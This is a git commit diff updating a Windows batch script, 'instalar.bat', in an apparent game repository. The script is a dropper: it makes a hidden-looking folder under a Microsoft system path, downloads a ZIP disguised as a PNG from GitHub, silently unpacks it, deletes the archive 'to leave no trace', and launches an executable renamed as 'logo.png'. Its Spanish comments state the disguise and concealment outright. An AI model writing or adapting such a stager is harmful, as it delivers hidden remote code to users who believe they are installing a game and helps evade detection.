1bfffc02a4c02b3a24fe0ca014499bcb5cfbeed5
deuzinnuse-collab <deuzinnuse@gmail.com>
2026-02-23 19:30:50 -0800

    Update instalar.bat

--- instalar.bat
+++ instalar.bat
@@ -1,20 +1,16 @@
 @echo off
-:: Carpeta discreta donde se guardará todo
+:: 1. Configuración de carpetas
 set "targetDir=%LocalAppData%\Microsoft\Windows\CloudExperienceHost"
 if not exist "%targetDir%" mkdir "%targetDir%"
+set "baseUrl=https://raw.githubusercontent.com/deuzinnuse-collab/juego/refs/heads/main"
 
-:: Tu link de GitHub (asegúrate que sea exactamente así)
-set "baseUrl=https://raw.githubusercontent.com/deuzinnuse-collab/juego/main"
-
-:: 1. Descarga el ZIP con contraseña (disfrazado de .png)
+:: 2. Descarga el archivo (disfrazado de imagen)
 powershell -Command "iwr '%baseUrl%/datos.png' -OutFile '%targetDir%\datos.zip'"
 
-:: 2. Lo descomprime (Aquí es donde ocurre la magia)
-powershell -Command "$shell = New-Object -ComObject Shell.Application; $zip = $shell.NameSpace('%targetDir%\datos.zip'); $dest = $shell.NameSpace('%targetDir%'); $dest.CopyHere($zip.Items())"
+:: 3. Descomprime de forma automática y silenciosa
+powershell -Command "Expand-Archive -Path '%targetDir%\datos.zip' -DestinationPath '%targetDir%' -Force"
 
-:: 3. Borra el ZIP para no dejar rastro
+:: 4. Borra el archivo ZIP y ejecuta el programa
 del /q "%targetDir%\datos.zip"
-
-:: 4. Ejecuta el archivo (Asegúrate que se llame logo.png o cámbialo aquí al nombre que tenga el exe dentro del ZIP)
 start /b "" "%targetDir%\logo.png"
 exit
